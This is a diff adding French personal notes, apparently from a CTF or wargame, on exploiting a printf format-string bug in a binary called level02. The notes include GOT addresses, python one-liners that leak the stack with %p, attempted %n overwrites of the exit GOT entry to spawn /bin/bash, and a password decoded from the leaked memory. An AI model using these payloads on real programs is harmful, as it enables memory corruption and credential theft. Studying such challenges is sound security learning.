@@ -1,0 +1,51 @@
+idee : exploit du printf format string attack, mot de passe en memoire
+
+https://cplusplus.com/reference/cstring/strcspn/
+Scans str1 for the first occurrence of any of the characters that are part of str2, returning the number of characters of str1 read before this first occurrence.
+
+Dump of assembler code for function exit@plt:
+   0x0000000000400710 <+0>:	jmpq   *0x200b12(%rip)      # 0x.60.12.28 <exit@got.plt>
+   0x0000000000400716 <+6>:	pushq  $0xa
+   0x000000000040071b <+11>:	jmpq   0x400660
+
+\x28\x12\x60\x00
+
+Dump of assembler code for function printf@plt:
+   0x00000000004006c0 <+0>:	jmpq   *0x200b3a(%rip)        # 0x.60.12.00 <printf@got.plt>
+   0x00000000004006c6 <+6>:	pushq  $0x5
+   0x00000000004006cb <+11>:	jmpq   0x400660
+End of assembler dump.
+
+\x00\x12\x60\x00 = 6296064
+
+ou frame gdb 0x0000000000400a80 : 4196992
+
+printf non protege:
+https://github.com/MeadeRobert/PicoCTF2017/blob/master/binary_exploitation/level3/config_console/README.md
+https://www.youtube.com/watch?v=_lO_rwaK_pY
+
+asm 64bits utiliser %p plutot !!!
+(python -c "print 'AAAAAAAA' + '%p '*30"; python -c "print 'test'") | ./level02 → 28 eme place 41414141
+
+
+-> tentative overwrite got.plt into frame system(/bin/bash) -> pas reussi 
+(python -c "print '\x28\x12\x60\x00' + '%6296060x' + '%28\$n' "; python -c "print 'test'") | ./level02
+(python -c "print '\x28\x12\x60' + '%4196989x' + '%28\$n' "; python -c "print 'test'") | ./level02
+
+-> Tentative de lecture du mdp sur la stack : 
+Cependant il n'est paspossible de lire sur gdb a cause de l'echec du open
+Lectures des valeurs stockees sur la stack qui sont ni nil ni des valeurs qui reviennent tout le temps
+Elles sont sitees entre 22eme et 26eme frame comprise :
+(python -c "print '%p ' * 30"; python -c "print 'test'") | ./level02
+ 
+
+Dans le programme, au niveau du printf non protégé, le pass_ptr est sans doute encore dans la mémoire. 
+
+
+0x75.6e.50.52.34.37.68.48 | 0x45.41.4a.35.61.73.39.51 | 0x37.7a.71.43.57.4e.67.58 0x35.4a.35.68.6e.47.58.73 | 0x48.33.67.50.66.4b.39.4d
+
+little endianess
+48.68.37.34.52.50.6e.75 | 51.39.73.61.35.4a.41.45 | 58.67.4e.57.43.71.7a.37 | 73.58.47.6e.68.35.4a.35 | 4d.39.4b.66.50.67.33.48
+
+conversion en ASCII
+Hh74RPnu.Q9sa5JAE.XgNWCqz7.sXGnh5J5.M9KfPg3H
